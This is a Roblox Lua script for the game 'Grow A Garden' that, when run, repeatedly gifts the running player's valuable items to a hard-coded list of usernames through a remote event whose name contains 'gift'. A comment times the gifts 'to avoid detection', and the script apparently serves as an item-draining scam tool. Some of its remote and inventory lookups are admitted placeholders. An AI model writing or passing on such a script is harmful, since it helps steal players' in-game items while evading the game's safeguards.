-- Grow A Garden Auto-Gift Script
-- Targets specific players and gifts them valuable items

-- Configuration
local targetPlayers = {
    "Yanzikke", -- Replace with actual usernames
    "Player2",
    "Player3"
}

local valuableItems = {
    "Blood Hedgehog", -- Replace with actual valuable item names in the game
    "Chicken Zombie",
    "Cactus"
}

-- Main variables
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Wait for game to load
while not player or not player.Character do
    wait(1)
end

-- Find gifting remote events/functions (these names are hypothetical - you'll need to find the actual ones)
local giftRemote
for _, child in pairs(ReplicatedStorage:GetDescendants()) do
    if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
        if string.find(child.Name:lower(), "gift") then
            giftRemote = child
            break
        end
    end
end

if not giftRemote then
    warn("Could not find gifting remote event/function")
    return
end

-- Function to gift items
local function giftToPlayer(targetName, itemName)
    local target = Players:FindFirstChild(targetName)
    if not target then
        warn("Target player not found: " .. targetName)
        return false
    end
    
    -- Try to find the item in our inventory (implementation depends on game structure)
    -- This is hypothetical - you'll need to adjust based on actual game structure
    local inventory = player:FindFirstChild("Inventory") or player.Backpack
    local itemToGift
    if inventory then
        for _, item in pairs(inventory:GetChildren()) do
            if item.Name == itemName then
                itemToGift = item
                break
            end
        end
    end
    
    if not itemToGift then
        warn("Item not found in inventory: " .. itemName)
        return false
    end
    
    -- Send gift request
    if giftRemote:IsA("RemoteEvent") then
        giftRemote:FireServer(target, itemToGift)
    else
        giftRemote:InvokeServer(target, itemToGift)
    end
    
    return true
end

-- Main gifting loop
while true do
    for _, targetName in pairs(targetPlayers) do
        for _, itemName in pairs(valuableItems) do
            local success = giftToPlayer(targetName, itemName)
            if success then
                print("Gifted " .. itemName .. " to " .. targetName)
                wait(5) -- Delay between gifts to avoid detection
            else
                wait(1)
            end
        end
    end
    wait(60) -- Check every minute if new gifts are available
end